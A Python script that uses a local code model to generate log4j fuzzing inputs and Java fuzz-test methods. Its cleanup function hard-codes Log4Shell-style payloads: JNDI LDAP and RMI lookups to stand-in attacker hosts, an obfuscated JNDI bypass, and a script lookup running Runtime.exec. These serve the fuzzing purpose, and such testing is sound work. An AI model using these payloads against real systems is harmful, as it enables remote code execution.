import os
import json
import time
import sys
import subprocess
import re

def install_required_packages():
    """Install required packages."""
    packages = ["llama-cpp-python[metal]"]
    for package in packages:
        try:
            print(f"Attempting to install {package} with Metal GPU support...")
            subprocess.check_call([
                sys.executable, "-m", "pip", "install",
                package,
                "--no-cache-dir",
                "--force-reinstall"
            ])
            print(f"Successfully installed {package} with Metal support")
        except subprocess.CalledProcessError as e:
            print(f"Error installing {package}: {e}")
            print("Attempting to install standard version...")
            try:
                subprocess.check_call([
                    sys.executable, "-m", "pip", "install",
                    "llama-cpp-python",
                    "--prefer-binary"
                ])
                print("Installation successful with standard options")
            except subprocess.CalledProcessError as e2:
                print(f"Error during second installation attempt: {e2}")
                sys.exit(1)


def initialize_model():
    """Initialize the model for text generation with GPU acceleration."""
    try:
        from llama_cpp import Llama
    except ImportError:
        print("llama_cpp module not found. Installing required packages...")
        install_required_packages()
        # Try importing again
        from llama_cpp import Llama

    model_path = "model/qwen2.5-coder-7b-instruct-q4_k_m.gguf"

    if not os.path.exists(model_path):
        raise FileNotFoundError(f"Model file not found at {model_path}. Please run download_model.py first.")

    print(f"Loading model from {model_path} with GPU acceleration...")

    # On Mac, use n_gpu_layers to offload to Metal
    n_gpu_layers = -1  # Use all layers

    # Initialize the model with parameters for GPU acceleration
    llm = Llama(
        model_path=model_path,
        n_ctx=2048,          # Reduced context size for faster inference
        n_batch=512,         # Batch size for prompt processing
        n_threads=4,         # Number of CPU threads
        n_gpu_layers=n_gpu_layers  # Use GPU for all layers
    )

    print("Model loaded successfully with GPU acceleration")
    return llm



def generate_log4j_test_cases(llm, num_cases=5):
    """Generate test cases for log4j fuzzing."""
    prompt_template = """<|im_start|>system
You are an expert Java developer specializing in creating test cases for fuzzing the log4j library.
<|im_end|>
<|im_start|>user
Generate a Java string that would be a good test case for fuzzing log4j. This string will be used as input to the following fuzzer methods:

1. fuzzPatternLayout - Generate a pattern string that might trigger interesting behavior in log4j's PatternLayout
2. fuzzLogMessages - Generate a log message that might trigger interesting behavior
3. fuzzJsonLayout - Generate content that might cause issues in JsonLayout
4. fuzzMessagePattern - Generate a message pattern format string that might reveal bugs

Focus on creating strings that might trigger edge cases, like special characters, extremely long strings, format specifiers, JNDI lookups, or other potentially problematic inputs.

Return ONLY the test string without any explanation or code wrapping.
<|im_end|>
<|im_start|>assistant
"""

    test_cases = []

    for i in range(num_cases):
        print(f"Generating test case {i+1}/{num_cases}...")

        # Generate a test case with higher temperature for more diversity
        completion = llm.create_completion(
            prompt=prompt_template,
            max_tokens=512,      # Reduced for faster generation
            temperature=0.8,
            top_p=0.95,
            repeat_penalty=1.1,
            stop=["<|im_end|>"]
        )

        # Extract the generated text
        generated_text = completion["choices"][0]["text"].strip()
        test_cases.append(generated_text)

        # Print a preview
        preview = generated_text[:50] + "..." if len(generated_text) > 50 else generated_text
        print(f"Generated: {preview}")

    # Save test cases to file
    output_path = "generated_tests/log4j_test_cases.json"
    with open(output_path, 'w') as f:
        json.dump(test_cases, f, indent=2)

    print(f"Generated {len(test_cases)} test cases and saved to {output_path}")
    return test_cases


def generate_fuzz_methods(llm, num_methods=5):
    """Generate fuzz test methods using the LLM."""

    # Examples from existing Log4jFuzzer.java to use as few-shot examples
    examples = """
    private static void fuzzPatternLayout(FuzzedDataProvider data) {
        String pattern = "";
        try {
            // Ensure we have some data to consume
            if (data.remainingBytes() > 0) {
                pattern = data.consumeString(Math.min(100, data.remainingBytes()));
            } else {
                pattern = "%m%n"; // Default pattern if no data
            }

            PatternLayout layout = PatternLayout.newBuilder()
                    .withPattern(pattern)
                    .build();

            LogEvent event = Log4jLogEvent.newBuilder()
                    .setLoggerName("FuzzerLogger")
                    .setLevel(Level.INFO)
                    .setMessage(new SimpleMessage("Fuzzed layout test"))
                    .build();

            layout.toByteArray(event);
        } catch (Exception e) {
            recordCrash("PatternLayout with pattern: " + pattern, e);
        }
    }
    
    private static void fuzzLogMessages(FuzzedDataProvider data) {
        String message = "";
        try {
            // Ensure we have data to consume
            if (data.remainingBytes() > 0) {
                message = data.consumeString(Math.min(100, data.remainingBytes()));
            } else {
                message = "default message";
            }

            // Test logging the fuzzer-generated message
            logger.info("Test message: {}", message);
            logger.error("Error with parameter: {}", message);

            // Try a dynamic log level if we have more data
            if (data.remainingBytes() > 0) {
                String levelStr = data.consumeString(Math.min(10, data.remainingBytes())).toUpperCase();
                Level level = Level.toLevel(levelStr, Level.INFO);
                logger.log(level, "Message at dynamic level: {}", message);
            }

            // Try context-based logging
            ThreadContext.put("fuzzKey", message);
            logger.info("Context map with fuzzed key: {}", message);
            ThreadContext.clearAll();
        } catch (Exception e) {
            recordCrash("LogMessages with message: " + message, e);
        }
    }
    """

    # Components to generate fuzz methods for
    components = [
        {"name": "MDC", "description": "Mapped Diagnostic Context (MDC) - key-value pairs that are bound to the thread context for logging"},
        {"name": "Markers", "description": "Markers are named objects used for filtering log statements"},
        {"name": "StructuredLogging", "description": "Structured logging with MapMessage and other structured message types"},
        {"name": "LoggerConfig", "description": "Logger configuration and manipulation of logger parameters"},
        {"name": "Filters", "description": "Log event filters including ThresholdFilter, LevelMatchFilter, and similar components"}
    ]

    prompt_template = """<|im_start|>system
You are an expert Java developer specializing in creating fuzz test methods for testing the log4j library.
<|im_end|>
<|im_start|>user
Create a Java method named "fuzz{name}" that will test the {description} functionality of log4j.

The method should:
1. Take a parameter of type FuzzedDataProvider
2. Create and manipulate log4j objects related to {description}
3. Handle exceptions properly and record crashes
4. Follow the same pattern as other fuzz test methods in the Log4jFuzzer class

Here are examples of existing fuzz test methods to guide your implementation:

{examples}

Here's the signature you should follow:

```java
private static void fuzz{name}(FuzzedDataProvider data) {{
    try {{
        // Your fuzz testing code here
        // Use data.consumeXXX methods to get input values
        
    }} catch (Exception e) {{
        recordCrash("{name} fuzzing", e);
    }}
}}
Generate ONLY the method implementation, with no additional explanation.
<|im_end|>
<|im_start|>assistant
"""
    generated_methods = []

    for component in components:
        print(f"Generating fuzz test method for {component['name']}...")

        # Format the prompt with component details
        formatted_prompt = prompt_template.format(
            name=component['name'],
            description=component['description'],
            examples=examples
        )

        # Generate the method
        completion = llm.create_completion(
            prompt=formatted_prompt,
            max_tokens=1024,
            temperature=0.7,
            top_p=0.9,
            repeat_penalty=1.1,
            stop=["<|im_end|>"]
        )

        # Extract the generated method
        method = completion["choices"][0]["text"].strip()
        generated_methods.append({
            "name": component['name'],
            "method": method
        })

        # Sleep briefly to avoid overwhelming the model
        time.sleep(1)

    return generated_methods



def generate_integration_code(llm, method_names):
    """Generate code to integrate the new fuzz methods into the main fuzzer method."""
    prompt = f"""<|im_start|>system
    You are an expert Java developer specializing in creating fuzz test methods for testing the log4j library.
    <|im_end|>
    <|im_start|>user
    I have added {len(method_names)} new fuzz test methods to my Log4jFuzzer class:
    {', '.join(['fuzz' + name for name in method_names])}
    Now I need to modify the main fuzzerTestOneInput method to include calls to these new methods.
    Here's the existing pattern:
    javapublic static void fuzzerTestOneInput(FuzzedDataProvider data) {{
        totalExecutions++;
        
        // Make sure test cases are loaded
        if (!loadedTestCases) {{
            loadTestCases();
        }}
    
        // Determine whether to use a predefined test case or raw data
        boolean usePredefined = !TEST_CASES.isEmpty() && 
                              data.remainingBytes() > 0 && 
                              data.consumeBoolean();
        
        String specialTestCase = null;
        if (usePredefined) {{
            int index = Math.abs(data.consumeInt()) % TEST_CASES.size();
            specialTestCase = TEST_CASES.get(index);
        }}
    
        try {{
            // Choose which test method to run
            int testMethod = data.remainingBytes() > 0 ? 
                    Math.abs(data.consumeInt()) % 4 : 0;
            
            switch (testMethod) {{
                case 0:
                    if (specialTestCase != null && specialTestCase.contains("%")) {{
                        fuzzPatternLayout(data, specialTestCase);
                    }} else {{
                        fuzzPatternLayout(data);
                    }}
                    break;
                case 1:
                    if (specialTestCase != null) {{
                        fuzzLogMessages(data, specialTestCase);
                    }} else {{
                        fuzzLogMessages(data);
                    }}
                    break;
                case 2:
                    if (specialTestCase != null && specialTestCase.contains("{{")) {{
                        fuzzJsonLayout(data, specialTestCase);
                    }} else {{
                        fuzzJsonLayout(data);
                    }}
                    break;
                case 3:
                    if (specialTestCase != null && specialTestCase.contains("{{")) {{
                        fuzzMessagePattern(data, specialTestCase);
                    }} else {{
                        fuzzMessagePattern(data);
                    }}
                    break;
            }}
    
            // Generate a report after a certain time
            if (totalExecutions % 1000 == 0 && System.currentTimeMillis() - startTime > 60000) {{
                generateReport();
            }}
        }} catch (Exception e) {{
            recordCrash("Main fuzzer method", e);
        }}
    }}
    Generate the updated version of this method that includes the new fuzz test methods in the switch statement.
    The new methods should be assigned case numbers starting from 4.
    Generate ONLY the updated method, with no additional explanation.
    <|im_end|>
    <|im_start|>assistant
    """
    # Generate the integration code
    completion = llm.create_completion(
        prompt=prompt,
        max_tokens=1536,
        temperature=0.7,
        top_p=0.9,
        repeat_penalty=1.1,
        stop=["<|im_end|>"]
    )

    # Extract the generated code
    integration_code = completion["choices"][0]["text"].strip()
    return integration_code

def clean_generated_code(code):
    """Clean generated code by removing unnecessary parts and fixing common issues."""
    # Remove code fence markers if present
    code = re.sub(r'```java\s*', '', code)
    code = re.sub(r'```\s*$', '', code)

    # Fix any malformed string literals (unclosed quotes, etc.)
    code = re.sub(r'("(?:[^"\\]|\\.)*$)', r'\1"', code)

    # Remove any imports that might have been generated
    code = re.sub(r'import .*?;\n', '', code)

    # Remove any class definitions that might have been generated
    code = re.sub(r'(?:public|private|protected)\s+(?:static\s+)?class\s+.*?{', '', code)

    # Fix common syntax issues
    code = code.replace('System.out.println', '// System.out.println')  # Comment out print statements

    return code

def save_results(methods, integration_code):
    """Save the generated methods and integration code to files."""
# Create output directory
    os.makedirs("generated_tests/fuzz_methods", exist_ok=True)

    # Save individual methods
    all_methods = ""
    for method in methods:
        method_name = method['name']
        method_code = clean_generated_code(method['method'])

        # Save to individual file
        with open(f"generated_tests/fuzz_methods/fuzz{method_name}.java", 'w') as f:
            f.write(method_code)

        all_methods += method_code + "\n\n"

    # Save all methods combined
    with open("generated_tests/fuzz_methods/all_methods.java", 'w') as f:
        f.write(all_methods)

    # Save integration code
    integration_code = clean_generated_code(integration_code)
    with open("generated_tests/fuzz_methods/fuzzerTestOneInput.java", 'w') as f:
        f.write(integration_code)

    print(f"Saved {len(methods)} fuzz methods and integration code to generated_tests/fuzz_methods/")


def clean_test_cases(input_filename="log4j_test_cases.json", output_filename="cleaned_test_cases.json"):
    """Clean up the generated test cases."""
    try:
        # Read the raw JSON file
        with open(f"generated_tests/{input_filename}", "r") as f:
            raw_test_cases = json.load(f)

        # List to hold cleaned test cases
        cleaned_test_cases = []

        # Process each test case
        for test_case in raw_test_cases:
            # Remove code block markers and explanation text
            test_case = re.sub(r'```[^\n]*\n', '', test_case)
            test_case = re.sub(r'```', '', test_case)
            test_case = re.sub(r'Here are some potential test cases.*?:\n\n', '', test_case, flags=re.DOTALL)
            test_case = re.sub(r'Please note that these test cases.*', '', test_case, flags=re.DOTALL)

            # Remove section headers like "1. fuzzPatternLayout:" and any explanatory text
            test_case = re.sub(r'\d+\.\s*fuzz[A-Za-z]+:.*?\n', '', test_case)

            # Split by newlines and add non-empty lines as separate test cases
            for line in test_case.strip().split('\n'):
                line = line.strip()
                if line:
                    # Replace escaped characters with actual characters
                    line = line.replace('\\n', '\n').replace('\\t', '\t').replace('\\r', '\r')
                    line = line.replace('\\x00', '\x00').replace('\\xFF', '\xFF')
                    line = line.replace('\\"', '"').replace('\\\\', '\\')

                    # Add test case if it looks interesting
                    if '${jndi:' in line or '%' in line or '${' in line or '{' in line and '}' in line:
                        cleaned_test_cases.append(line)
                    elif len(line) > 5:  # Avoid very short meaningless fragments
                        cleaned_test_cases.append(line)

        # Add some specific test cases that are known to be useful
        additional_test_cases = [
            "${jndi:ldap://malicious.example.com/payload}",
            "${jndi:rmi://attacker.com/object}",
            "%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n",
            "${${env:ENV_NAME:-j}ndi${::-:}ldap://malicious.com/}",
            "{\"message\": \"%m\", \"level\": \"%p\", \"nested\": {\"field1\": \"%d\", \"field2\": \"%t\"}}",
            "Format with {0} and {1} and {999}",
            "${ctx:userID} ${ctx:loginID}",
            "%notaformat %anothernonformat %%percent",
            "${script:javascript:java.lang.Runtime.getRuntime().exec('calc.exe')}"
        ]

        # Add the additional test cases and remove duplicates
        cleaned_test_cases.extend(additional_test_cases)
        cleaned_test_cases = list(set(cleaned_test_cases))

        # Save cleaned test cases
        with open(f"generated_tests/{output_filename}", "w") as f:
            json.dump(cleaned_test_cases, f, indent=2)

        print(f"Cleaned {len(raw_test_cases)} raw test cases into {len(cleaned_test_cases)} useful test cases")
        return cleaned_test_cases

    except Exception as e:
        print(f"Error cleaning test cases: {e}")
        return []

if __name__ == "__main__":
    try:
        # Create directory structure if needed
        os.makedirs("generated_tests", exist_ok=True)

        # Install packages with Metal support
        install_required_packages()

        # Initialize model with GPU acceleration
        llm = initialize_model()

        # Ask user what to generate
        generate_type = input("What would you like to generate? (1: Test Cases, 2: Fuzz Methods, 3: Both): ")

        if generate_type == "1" or generate_type == "3":
            # Generate test cases
            print("\n--- Generating Test Cases ---\n")
            num_cases = int(input("How many test cases would you like to generate? (default: 5): ") or "5")
            test_cases = generate_log4j_test_cases(llm, num_cases=num_cases)

            # Clean test cases
            print("\n--- Cleaning Test Cases ---\n")
            cleaned_test_cases = clean_test_cases()

        if generate_type == "2" or generate_type == "3":
            # Generate fuzz methods
            print("\n--- Generating Fuzz Methods ---\n")
            num_methods = int(input("How many fuzz methods would you like to generate? (default: 5): ") or "5")
            methods = generate_fuzz_methods(llm, num_methods=num_methods)

            # Extract method names
            method_names = [method['name'] for method in methods]

            # Generate integration code
            print("\n--- Generating Integration Code ---\n")
            integration_code = generate_integration_code(llm, method_names)

            # Save results
            save_results(methods, integration_code)

        print("\nNext steps:")
        if generate_type == "1" or generate_type == "3":
            print("1. Run integrate_tests.py to integrate test cases into the fuzzer")
        if generate_type == "2" or generate_type == "3":
            print("2. Copy the generated fuzz methods to your Log4jFuzzer.java file")
            print("3. Replace the fuzzerTestOneInput method with the generated version")
        print("4. Compile and run the fuzzer with the new methods and test cases")

    except Exception as e:
        print(f"Error: {e}")